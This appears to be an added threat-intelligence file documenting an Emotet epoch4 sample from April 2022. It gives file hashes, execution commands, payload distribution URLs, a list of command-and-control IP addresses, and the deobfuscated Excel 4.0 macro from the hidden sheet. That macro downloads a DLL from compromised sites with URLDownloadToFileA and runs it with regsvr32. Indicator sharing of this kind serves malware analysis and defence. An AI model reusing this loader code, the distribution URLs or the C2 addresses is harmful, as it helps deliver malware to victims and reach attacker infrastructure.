@@ -1,0 +1,129 @@
+Emotet 2022 | epoch4 | 22.04.2022 | 
+
+************************************************************************************************************
+
+.xls 360cf9e5ef0a5fd454dd48fbb70fbbfff60a1654d8e3f878cedb472e8ab7c514
+.dll 9c528258677701a47fcd65ccddc4f0d688cf68137c724a78944fdf19370cce0f
+.dll d066ecfd941bdc31f228a2ae249af27c005525847cf21ad6e48098ec2e23efc6
+
+************************************************************************************************************
+
+Exec >>
+
+EXCEL.EXE C:\Users\Admin\AppData\Local\Temp\untitled-0422.xls
+
+C:\Windows\System32\regsvr32.exe ..\xdwno.ocx
+
+C:\Windows\system32\regsvr32.exe "C:\Windows\system32\Lxqpduzzohzmvvz\zggwsmixdvxmw.otv"
+
+************************************************************************************************************
+
+.dll distro
+
+http://congtycamvinh.com/plugins/jG3iqpQaTL1TXYMolH/
+http://ecube.com.mx/e2oCWBnC/6wp2K4sfQmVIRy6ZvdiH/
+http://dulichdichvu.net/libraries/6vhzwoZoNDSMtSC/
+http://gnif.org/administrator/G68HwUGlKNJNU2vh5cz/
+https://edoraseguros.com.br/cgi-bin/l7ZERv5deNsfzlZUZ/
+https://sanoma.allrent.nl/cgi-bin/KXbI5OhLJ/
+hxxps://famesa.com.ar/dos/gaa/
+hxxps://www.fantasyclub.com.br/imgs/rggmVTfvT/
+hxxp://ecoarch.com.tw/cgi-bin/vWW/
+hxxp://dp-flex.co.jp/cgi-bin/Bt3Ycq5Tix/
+hxxp://dharmacomunicacao.com.br/OLD/PjBkVBhUH/
+hxxp://expresocba.com.ar/snnyNkcVAE3Ztitw/TT0h7/ 
+
+************************************************************************************************************
+
+Hidden Sheet:
+
+          =FORMULA(Vv1!P22&Vv1!H9&Vv1!L2&Vv1!B15&Vv1!B15&Vv2!B3&Vv2!D7&Vv2!G11&Vv1!H4&Vv2!L9&Vv3!D15&Vv2!D17&Vv3!D9&Vv3!J16,F12)=FORMULA(Vv1!P22&Vv1!J11&Vv1!B18&Vv1!P11&"HRHRE1"&Vv3!P5&Vv1!H9&Vv1!L2&Vv1!B15&Vv1!B15&Vv2!B3&Vv2!D7&Vv2!G11&Vv1!H4&Vv2!L9&Vv3!D15&Vv2!E19&Vv3!D9&Vv3!J16&Vv1!P13,F14)=FORMULA(Vv1!P22&Vv1!J11&Vv1!B18&Vv1!P11&"HRHRE2"&Vv3!P5&Vv1!H9&Vv1!L2&Vv1!B15&Vv1!B15&Vv2!B3&Vv2!D7&Vv2!G11&Vv1!H4&Vv2!L9&Vv3!D15&Vv2!F17&Vv3!D9&Vv3!J16&Vv1!P13,F16)=FORMULA(Vv1!P22&Vv1!J11&Vv1!B18&Vv1!P11&"HRHRE3"&Vv3!P5&Vv1!H9&Vv1!L2&Vv1!B15&Vv1!B15&Vv2!B3&Vv2!D7&Vv2!G11&Vv1!H4&Vv2!L9&Vv3!D15&Vv2!G19&Vv3!D9&Vv3!J16&Vv1!P13,F18)=FORMULA(Vv1!P22&Vv1!J11&Vv1!B18&Vv1!P11&"HRHRE4"&Vv3!P5&Vv1!H9&Vv1!L2&Vv1!B15&Vv1!B15&Vv2!B3&Vv2!D7&Vv2!G11&Vv1!H4&Vv2!L9&Vv3!D15&Vv2!H17&Vv3!D9&Vv3!J16&Vv1!P13,F20)=FORMULA(Vv1!P22&Vv1!J11&Vv1!B18&Vv1!P11&"HRHRE5"&Vv3!P5&Vv1!H9&Vv1!L2&Vv1!B15&Vv1!B15&Vv2!B3&Vv2!D7&Vv2!G11&Vv1!H4&Vv2!L9&Vv3!D15&Vv2!I19&Vv3!D9&Vv3!J16&Vv1!P13,F22)=FORMULA(Vv1!P22&Vv1!J11&Vv1!B18&Vv1!P11&"HRHRE6"&Vv3!P5&Vv1!H9&Vv1!B15&Vv1!I17&Vv1!I3&Vv1!H13&Vv1!P11&Vv1!K9&Vv1!P13&Vv1!P7&Vv1!P13,F26)=FORMULA(Vv1!P22&Vv1!H13&Vv1!N4&Vv1!H13&Vv1!H9&Vv1!P11&Vv1!P15&Vv1!H9&Vv1!P20&Vv3!L11&Vv3!T2&Vv1!C3&Vv3!N14&Vv1!C3&Vv3!R13&Vv3!J3&Vv1!P15&Vv1!P13,F28)=FORMULA(Vv1!P22&Vv1!G24&Vv1!H13&Vv1!I26&Vv1!E11&Vv1!F4&Vv1!K23&Vv1!P11&Vv1!P13,F32)
+          
+          =CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"http://congtycamvinh.com/plugins/jG3iqpQaTL1TXYMolH/","..\xdwno.ocx",0,0)
+          
+          =IF(HRHRE1<0, CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"http://ecube.com.mx/e2oCWBnC/6wp2K4sfQmVIRy6ZvdiH/","..\xdwno.ocx",0,0))
+          
+          =IF(HRHRE2<0, CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"http://dulichdichvu.net/libraries/6vhzwoZoNDSMtSC/","..\xdwno.ocx",0,0))
+          
+          =IF(HRHRE3<0, CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"http://gnif.org/administrator/G68HwUGlKNJNU2vh5cz/","..\xdwno.ocx",0,0))
+          
+          =IF(HRHRE4<0, CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"https://edoraseguros.com.br/cgi-bin/l7ZERv5deNsfzlZUZ/","..\xdwno.ocx",0,0))
+          
+          =IF(HRHRE5<0, CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"https://sanoma.allrent.nl/cgi-bin/KXbI5OhLJ/","..\xdwno.ocx",0,0))
+          
+          
+          
+          =IF(HRHRE6<0, CLOSE(0),)
+          
+          =EXEC("C:\Windows\System32\regsvr32.exe ..\xdwno.ocx")
+          
+          
+          
+          =RETURN()
+
+
+c2's
+
+138.201.142.73:8080
+138.197.147.101:443
+134.195.212.50:7080
+104.168.154.79:8080
+149.56.131.28:8080
+129.232.188.93:443
+212.24.98.99:8080
+119.193.124.41:7080
+45.118.115.99:8080
+188.44.20.25:443
+103.132.242.26:8080
+201.94.166.162:443
+1.234.21.73:7080
+206.189.28.199:8080
+185.8.212.130:7080
+82.165.152.127:8080
+176.104.106.96:8080
+173.212.193.249:8080
+167.99.115.35:8080
+209.126.98.206:8080
+185.157.82.211:8080
+212.237.17.99:8080
+185.4.135.165:8080
+51.91.7.5:8080
+187.84.80.182:443
+164.68.99.3:8080
+107.182.225.142:8080
+58.227.42.236:80
+103.75.201.2:443
+101.50.0.91:8080
+216.158.226.206:443
+151.106.112.196:8080
+45.235.8.30:8080
+146.59.226.45:443
+45.176.232.124:443
+134.122.66.193:8080
+51.254.140.238:7080
+131.100.24.231:80
+167.172.253.162:8080
+50.30.40.196:8080
+203.114.109.124:443
+94.23.45.86:4143
+189.126.111.200:7080
+160.16.142.56:8080
+27.54.89.58:8080
+5.9.116.246:8080
+46.55.222.11:443
+209.97.163.214:443
+110.232.117.186:8080
+1.234.2.232:8080
+153.126.146.25:7080
+183.111.227.137:8080
+196.218.30.83:443
+103.70.28.102:8080
+51.91.76.89:8080
+91.207.28.33:8080
+72.15.201.15:8080
+103.43.46.182:443
+209.250.246.206:443
+197.242.150.244:8080
+159.65.88.10:8080
+172.104.251.154:8080
+158.69.222.101:443
